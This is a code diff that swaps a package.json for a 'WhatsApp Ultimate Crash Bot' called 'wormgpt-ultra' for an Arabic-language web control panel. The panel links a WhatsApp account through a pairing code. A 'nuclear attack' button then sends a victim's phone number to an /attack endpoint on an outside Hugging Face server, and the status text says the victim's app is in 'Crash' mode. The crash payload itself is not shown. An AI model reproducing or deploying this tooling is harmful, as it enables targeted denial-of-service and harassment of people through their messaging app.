@@ -1,17 +1,181 @@
-{
-  "name": "wormgpt-ultra",
-  "version": "1.5.0",
-  "description": "WhatsApp Ultimate Crash Bot",
-  "main": "index.js",
-  "scripts": {
-    "start": "node index.js"
-  },
-  "dependencies": {
-    "@whiskeysockets/baileys": "^6.6.0",
-    "express": "^4.18.2",
-    "cors": "^2.8.5",
-    "pino": "^8.19.0",
-    "fs-extra": "^11.2.0"
-  }
-}
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>KAMUSARI - SHANKS EDITION</title>
+    <style>
+        /* إعدادات الشاشة الأساسية والخلفية */
+        body { 
+            /* الخلفية هي الصورة الأصلية وتملأ الشاشة */
+            background-image: url('image_1.png'); /* اسم الملف الأصلي */
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed; /* الخلفية تظل ثابتة عند التمرير */
+            color: white; 
+            font-family: 'Poppins', sans-serif; 
+            text-align: center; 
+            margin: 0;
+            padding: 20px;
+        }
 
+        /* عنوان KAMUSARI فوق الإطارات */
+        .header-title {
+            color: #ff0000;
+            font-size: 50px;
+            font-weight: bold;
+            font-family: 'Times New Roman', serif;
+            margin-top: 20px;
+            margin-bottom: 30px;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000; /* توهج أحمر */
+            letter-spacing: 5px;
+        }
+
+        /* الإطارات الرئيسية (شبه شفافة لتظهر الخلفية) */
+        .main-frame {
+            border: 4px solid #ff0000; /* إطار أحمر */
+            background: rgba(0, 0, 0, 0.7); /* خلفية سوداء شفافة لتظهر الصورة خلفها */
+            border-radius: 15px; 
+            display: inline-block; 
+            padding: 25px; 
+            box-shadow: 0 0 25px #ff0000, 0 0 50px #ff0000; /* شعاع نور أحمر قوي */
+            width: 90%;
+            max-width: 450px;
+            margin-bottom: 40px;
+        }
+
+        /* المكان الأخضر الداخلي */
+        .input-label {
+            background: #00ff00; /* أخضر نيون */
+            color: black; 
+            font-weight: bold; 
+            padding: 10px; 
+            margin-bottom: 20px; 
+            border-radius: 5px; 
+            font-size: 18px;
+            display: inline-block;
+            box-shadow: 0 0 10px #00ff00; /* شعاع نور أخضر */
+        }
+
+        /* الإطار الأبيض الداخلي المشع بالأحمر */
+        .inner-frame {
+            border: 3px solid #ffffff; /* إطار أبيض */
+            border-radius: 10px; 
+            padding: 20px; 
+            background: rgba(255, 255, 255, 0.05); /* خلفية بيضاء شفافة جداً */
+            display: inline-block;
+            box-shadow: 0 0 15px #ff0000; /* شعاع نور أحمر */
+            width: 80%;
+            margin-bottom: 20px;
+        }
+
+        /* المكان الوردي لإدخال الرقم */
+        input[type="text"] { 
+            padding: 15px; 
+            width: 90%; 
+            margin: 0 auto;
+            background: #ff007f; /* وردي غامق */
+            color: white; 
+            border: none; 
+            border-radius: 5px;
+            text-align: center; 
+            font-size: 18px; 
+            box-shadow: 0 0 10px #ff007f; /* شعاع نور وردي */
+            outline: none; /* إزالة إطار التركيز */
+        }
+
+        /* أزرار التحكم */
+        .cmd-btn {
+            padding: 12px 25px; 
+            margin: 10px; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            transition: transform 0.2s; /* تأثير حركة */
+            text-transform: uppercase;
+        }
+        
+        .cmd-btn:hover {
+            transform: scale(1.1); /* تكبير الزر عند الوقوف عليه */
+        }
+
+        .btn-link { background: #fff; color: #000; box-shadow: 0 0 10px #fff; }
+        .btn-attack { background: #ff0000; color: #fff; box-shadow: 0 0 15px #ff0000; }
+
+        /* المكان الأزرق */
+        .credits-label {
+            background: #0000ff; /* أزرق نقي */
+            color: white; 
+            font-weight: bold; 
+            padding: 10px; 
+            margin-top: 20px; 
+            border-radius: 5px; 
+            font-size: 18px;
+            display: inline-block;
+            box-shadow: 0 0 15px #0000ff; /* شعاع نور أزرق */
+            font-family: 'Courier New', monospace;
+        }
+
+        /* نصوص الحالة (Status) والكود */
+        #status { margin-top: 15px; color: yellow; text-shadow: 0 0 5px yellow; font-size: 16px; }
+        #qrCode { margin-top: 15px; font-size: 20px; color: #fff; text-shadow: 0 0 5px #fff; }
+
+    </style>
+</head>
+<body>
+
+    <div class="header-title">𝑲𝑨𝑳𝑴𝑺𝑨𝑹𝑰</div>
+
+    <div class="main-frame">
+        
+        <div class="input-label">ENTER YOUR NUMBER</div>
+        
+        <div class="inner-frame">
+            <input type="text" id="phone" placeholder="أدخل الرقم (مثال: 212xxxx)">
+        </div>
+        
+        <button class="cmd-btn btn-link" onclick="getCode()">طلب كود الربط</button>
+        <button class="cmd-btn btn-attack" onclick="startAttack()">إطلاق الهجوم النووي 🔥</button>
+        
+        <div id="status"></div>
+        <div id="qrCode"></div>
+    </div>
+
+    <div class="credits-label">𝑴𝑨𝑫𝑬 𝑩𝒀 𝑺𝑰𝑹 𝑺𝑯𝑨𝑵𝑲𝑺</div>
+
+    <script>
+        // رابط سيرفر Hugging Face الخاص بك
+        const API_BASE = "https://yasonuak-chrash-001.hf.space";
+
+        async function getCode() {
+            const phone = document.getElementById('phone').value;
+            if(!phone) { alert("أدخل رقم الهاتف أولاً"); return; }
+            document.getElementById('status').innerText = "جاري طلب الكود... انتظر 15 ثانية";
+            document.getElementById('qrCode').innerText = "";
+            try {
+                const res = await fetch(`${API_BASE}/get-code?phone=${phone}`);
+                const data = await res.json();
+                if(data.code) {
+                    document.getElementById('qrCode').innerText = "كود الربط الخاص بك هو: " + data.code;
+                    document.getElementById('status').innerText = "تم استلام الكود! ادخله في واتساب الآن.";
+                }
+            } catch (e) {
+                document.getElementById('status').innerText = "خطأ في الاتصال بالسيرفر، تأكد أنه Running";
+            }
+        }
+
+        async function startAttack() {
+            const phone = document.getElementById('phone').value;
+            if(!phone) { alert("أدخل رقم الضحية أولاً"); return; }
+            document.getElementById('status').innerText = "🚀 جاري الجلد... القذائف تنطلق الآن!";
+            try {
+                // إرسال طلب للهجوم على نفس الرقم المدخل
+                await fetch(`${API_BASE}/attack?target=${phone}`);
+                document.getElementById('status').innerText = "✅ الهجوم مستمر.. الضحية في وضع الـ Crash!";
+            } catch (e) {
+                document.getElementById('status').innerText = "فشل الهجوم، تأكد من ربط البوت أولاً";
+            }
+        }
+    </script>
+</body>
+</html>
